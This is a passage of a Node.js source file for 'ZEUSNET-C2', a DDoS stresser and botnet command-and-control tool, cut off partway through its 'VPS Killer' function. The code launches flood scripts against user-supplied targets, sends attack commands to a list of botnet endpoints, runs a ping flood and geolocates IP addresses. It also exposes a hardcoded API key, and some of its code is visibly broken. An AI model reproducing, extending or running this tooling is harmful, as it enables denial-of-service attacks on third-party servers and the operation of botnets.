#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '1.0.0' 
let processList = [];
const cyan = '\x1b[96m';
const bold = '\x1b[1m';
const kuning_emas = '\x1b[93m';
const Reset = '\x1b[0m';
const biru = '\x1b[36m';
const biru_terang = '\x1b[94m';
const biru_tua = '\x1b[38;2;0;0;139m';
const teksmerah = '\x1b[31m';
const teksungu = '\x1b[95m';
const hijau = '\x1b[38;2;144;238;144m';
const orange = '\x1b[38;2;255;165;0m';


const steven = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
${orange}Welcome User To ZEUSNET-C2 Tools${Reset}
⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀ ${bold}${hijau}OWNER TOOLS: t.me/stevenstoree/@STEVENC2${Reset}
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀ ${bold}${biru_tua}USERNAME TOOLS: @STEVENC2${Reset}
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀ ${bold}${biru}EXPIRED: NO EXPIRED${Reset}
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄ ${bold}${teksmerah}TIME LIMIT: NO LIMIT${Reset}
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇ ${bold}${biru_terang}VIP: TRUE${Reset}
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃ ${bold}${kuning_emas}COOLDOWN: 0${Reset}
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀
${bold}${biru_terang}Type 'Help' For Showing All Fitur Command Tools ZEUSNET-C2${Reset} 
`)}
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error Fetching Data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error Fetching Data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/StevenBisnis22/cache/refs/heads/main/version.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
    
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/StevenBisnis22/cache/refs/heads/main/sigma.txt');
    const password = await secretBangetJir.text();
    await console.log(`lovenet`)
    steven.question('[\x1b[1m\x1b[31mPassword lovenet\x1b[0m]: \n', async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`Password lovenet ZEUSNET-C2`)
        await scrapeProxy()
        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
        await scrapeUserAgent()
        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
        await sleep(700)
        console.clear()
        console.log(`Welcome Guys To ZEUSNET-C2 Stresser Tools ${version}`)
        await sleep(1000)
		    await banner()
        console.log(`==========================================================================`)
        sigma()
      } else {
        console.log(`lovenet`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      await exec(`npm uninstall -g prmnmd-tuls`)
      await exec(`npm i -g prmnmd-tuls`)
      console.log(`Sedang Terkena Bug Harap Restart Ulang Tools ZEUSNET-C2`)
      process.exit()
    }
  } catch (error) {
    console.log(`Apakah Anda Online?`)
  }
}
// ====== //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} Seconds Ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: Zeus-Tls <Target>  <Port> <Duration>
Zeus-Tls https://google.com 433 120`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${bold}${cyan}Attack Has Been Launched${Reset}
========================================================================
${bold}${cyan}STATUS${Reset}   : \x1b[94mAttack Has Successfully Launched\x1b[0m
${bold}${cyan}Target${Reset}   : ${target}
${bold}${cyan}Duration${Reset} : ${duration}
${bold}${cyan}Methods${Reset}  : ${methods}
${bold}${cyan}ISP${Reset}      : ${result.isp}
${Reset}Ip${Reset}       : ${result.query}
${bold}${cyan}AS${Reset}       : ${result.as}
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
  if (methods === 'zeus-flood') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
 } else if (methods === 'zxm') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
 } else if (methods === 'ciko') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
 } else if (methods === 'zeus-love') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
 } else if (methods === 'glory') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
 } else if (methods === 'zeus-tls') {
    pushOngoing(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 100 10`)
    sigma()
  } else if (methods === 'xin') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
 } else if (methods === 'zs-browser') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10`)
    sigma()
 } else if (methods === 'flayingraw') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10`)
    sigma()
 } else if (methods === 'steven') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
 } else if (methods === 'zeus-steven') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
   sigma()
 } else if (methods === 'zeus-raw') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
   sigma()
 } else if (methods === 'black') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10`)
    sigma()
 } else if (methods === 'zeus-flash') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
   sigma()
 } else if (methods === 'ciko') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
 } else if (methods === 'zs-bypass') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
   sigma()
 } else if (methods === 'flaybypass') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
 } else if (methods === 'sad') {
      pushOngoing(target, methods, duration)
       exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
   sigma()
 } else if (methods === 'ninja') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10`)
    sigma()
 } else if (methods === 'flood1') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
 } else if (methods === 'zeus-sad') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
 } else if (methods === 'cici') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
 } else if (methods === 'cibi') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
 } else if (methods === 'chaptcha') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
 } else if (methods === 'cat') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
 } else if (methods === 'geckold') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
    sigma()
 } else if (methods === 'fire') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10`)
    sigma()
 } else if (methods === 'mixed') {
       pushOngoing(target, methods, duration)
const zeus_flash = path.join(__dirname, `/lib/cache/zeus-flash.js`);
const zs_bypass = path.join(__dirname, `/lib/cache/zs-bypass.js`);
        exec(`node ${zeus-flash} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${zs-bypass} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else {
    console.log(`Methods ${methods} Is Not Recognized In List ZEUSNET-C2.`);
  }
};
// [========================================] //
function methods() {
    
    const methodsData = JSON.parse(fs.readFileSync('lib/methods.json', 'utf-8'));

    console.log(`                          Methods`);
    console.log(` NAME      │ DESCRIPTION                    │ DURATION`);
    console.log(`───────────┼────────────────────────────────┼──────────`);

    methodsData.forEach(method => {
        console.log(
            `${method.name.padEnd(10)} │ ${method.description.padEnd(30)} │ ${method.duration.padEnd(3)}`
        );
    });
}

// Logika Untuk Menjalankan Perintah
const command = process.argv[2]; 
// ===========================================//
async function AttackBotnetEndpoints(args) {
    if (args.length < 3) {
        console.log(`Example: Ddos <Target> <Duration> <Methods>\nDdos https://google.com 120 zeus-flood`);
        sigma();
        return;
    }

    const [target, duration, methods] = args;
    let result;

    try {
        const parsedUrl = new url.URL(target);
        const hostname = parsedUrl.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        result = scrape.data;

        const startTime = Date.now();
        const endTime = startTime + duration * 1000;
        processList.push({ target, methods, startTime, duration, endTime, ip: result.query });

        console.clear()
        console.log(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${bold}${cyan}Attack Has Been Launched${Reset}
========================================================================
${bold}${cyan}Target Detail${Reset}
${bold}${cyan} - Target${Reset}   : [ ${target} ]
${bold}${cyan} - Isp${Reset}      : [ ${result.isp} ]
${bold}${cyan} - Ip${Reset}       : [ ${result.query} ]
${bold}${cyan} - As${Reset}      : [ ${result.as} ]
${bold}${cyan}Attack Detail${Reset}
${bold}${cyan} - STATUS${Reset}   : \x1b[94mAttack Has Successfully Launched\x1b[0m
${bold}${cyan} - PORT :     [ 443 ]${Reset}
${bold}${cyan} - Duration${Reset} : [ ${duration} ]
${bold}${cyan} - Methods${Reset}  : [ ${methods} ]
`);
        sigma();
    } catch (error) {
        console.error('Error Retrieving Target Information:', error.message);
    }

    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load Botnet Data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error Loading Botnet Data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send Requests To Each Endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error Sending Request To ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // Save Valid Endpoints Back To The File
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error Saving Botnet Data:', error.message);
        sigma();
    }
}

async function processBotnetEndpoint(args) {
    if (args.length < 1) {
    console.log(`Example: Addsrv <Endpoints>
Addsrv http://1.1.1.1:2000/zeusnet`);
    sigma();
	return
  }
    try {
        const parsedUrl = new url.URL(args);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/zeusnet';

        // Load Botnet Data
        let botnetData;
        try {
            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            console.error('Error Loading Botnet Data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Check If Endpoint Already Exists
        if (botnetData.endpoints.includes(endpoint)) {
            return console.log(`Endpoint ${endpoint} Is Already In The Botnet List.`);
            sigma();
            return;           
        }

        // Add Endpoint And Save Data
        botnetData.endpoints.push(endpoint);
        try {
            await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error Saving Botnet Data:', error.message);
            return console.log('Error Saving Botnet Data.');
        }

        // Reply With Success Message
        console.log(`Endpoint ${endpoint} Added To Botnet.`);
        sigma()
    } catch (error) {
        console.error('Error Processing Botnet Endpoint:', error.message);
        console.log('An Error Occurred While Processing The Endpoint.');
        sigma()
    }
}

// [========================================] //
async function processBotnetEndpoint(args) {
    if (args.length < 1) {
    console.log(`Example: Addsrv <Endpoints>
Addsrv http://1.1.1.1:2000/zeusnet`);
    sigma();
	return
  }
    try {
        const parsedUrl = new url.URL(args);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/zeusnet';

        // Load Botnet Data
        let botnetData;
        try {
            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            console.error('Error Loading Botnet Data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Check If Endpoint Already Exists
        if (botnetData.endpoints.includes(endpoint)) {
            return console.log(`Endpoint ${endpoint} Is Already In The Botnet List.`);
            sigma();
            return;           
        }

        // Add Endpoint And Save Data
        botnetData.endpoints.push(endpoint);
        try {
            await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error Saving Botnet Data:', error.message);
            return console.log('Error Saving Botnet Data.');
        }

        // Reply With Success Message
        console.log(`Endpoint ${endpoint} Added To Botnet.`);
        sigma()
    } catch (error) {
        console.error('Error Processing Botnet Endpoint:', error.message);
        console.log('An Error Occurred While Processing The Endpoint.');
        sigma()
    }
}
// [========================================] //
async function checkBotnetEndpoints() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load Botnet Data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error Loading Botnet Data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send Requests To Each Endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=https://google.com&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error Sending Request To ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error Saving Server Data:', error.message);
        sigma()
    }

    // Reply With The Results
    console.log(`Checked Server. ${successCount} Server Is Online.`);
    sigma()
}

async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: Track-Ip <Ip Address>
Track-Ip 1.1.1.1`);
    sigma();
	return
  }
const [target] = args
  if (target === '0.0.0.0') {
  console.log(`Jangan Di Ulangi Manis Nanti Di Delete User Mu`)
	sigma()
  } else {
    try {
const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
const res = await fetch(`https://ipwho.is/${target}`);
const additionalInfo = await res.json();
const ipInfo = await response.json();

    console.clear()
    console.log(`
⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${bold}${cyan}Tracking IP Address Result${Reset} 
Type ${bold}${biru_terang}"Cls"${Reset} To Clear Terminal
========================================================================
${bold}${cyan} - Flags${Reset}: ${ipInfo.country_flag}
${bold}${cyan} - Country${Reset}: ${ipInfo.country_name}
${bold}${cyan} - Capital${Reset}: ${ipInfo.country_capital}
${bold}${cyan} - City${Reset}: ${ipInfo.city}
${bold}${cyan} - ISP${Reset}: ${ipInfo.isp}
${bold}${cyan} - Organization${Reset}: ${ipInfo.organization}
${bold}${cyan} - Lat${Reset}: ${ipInfo.latitude}
${bold}${cyan} - Long${Reset}: ${ipInfo.longitude}
      
${bold}${cyan} Google Maps${Reset}: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}
`)
    sigma()
  } catch (error) {
      console.log(`Error Tracking ${target}`)
      sigma()
    }
    }
};
// [========================================] //
async function pod(args) {
  if (args.length < 2) {
    console.log(`Example: Kill-Ping <Target> <Duration>
Kill-Ping 123.456.789.10 120`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.log(`
⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
========================================================================
${bold}${cyan}TARGET DETAIL${Reset}
 \x1b[1;31m  Attacks Details
\x1b[1;31m      Status:     [\x1b[1;94m Attack Sent Successfully All Server \x1b[1;31m]
\x1b[1;31m      HOST:       [\x1b[1m\x1b[95m ${target}  \x1b[1;31m]
\x1b[1;31m      PORT:       [\x1b[1m\x1b[95m 443 \x1b[1;31m]
\x1b[1;31m      TIME:       [\x1b[1m\x1b[95m ${duration} \x1b[1;31m]
\x1b[1;31m      METHODS:    [\x1b[1m\x1b[95m Kill-Ping \x1b[1;31m]
\x1b[1;31m  TARGET DETAILS
\x1b[1;31m      ASN:        [\x1b[1m\x1b[95m ${result.as} \x1b[1;31m]
\x1b[1;31m      ISP:        [\x1b[1m\x1b[95m ${result.isp} \x1b[1;31m]
\x1b[1;31m      IP:        [\x1b[1m\x1b[95m ${result.query} \x1b[1;31m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/ping.js`);
exec(`node ${metode} ${target} 66507 6 1 ${duration}`)
sigma()
};
// [========================================] //
async function killDo(args) {
  if (args.length < 2) {
    console.log(`Example: Kill-Do <Target> <Duration>
Kill-Do 123.456.78.910 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${bold}${cyan}VPS Killer Has Been Launched${Reset}
========================================================================
${bold}${cyan}STATUS${Reset}   : \x1b[94mAttack Has Successfully Launched\x1b[0m
${bold}${cyan}Target${Reset}   : ${target}
